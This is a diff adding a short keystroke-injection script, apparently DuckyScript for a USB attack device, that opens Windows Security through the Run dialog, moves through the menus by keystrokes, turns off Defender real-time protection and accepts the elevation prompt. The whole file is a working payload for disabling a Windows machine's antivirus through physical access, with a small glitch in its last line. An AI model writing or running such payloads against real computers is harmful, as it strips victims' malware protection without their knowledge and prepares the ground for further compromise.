@@ -1,0 +1,16 @@
+REM Temporarily disable Windows 10 Defender (Realtime protection)
+DELAY 1000
+GUI r
+STRING windowsdefender:///
+ENTER
+ENTER
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+ENTER
+SPACE
+ALT y
+DELAY 100
+ALT f4r
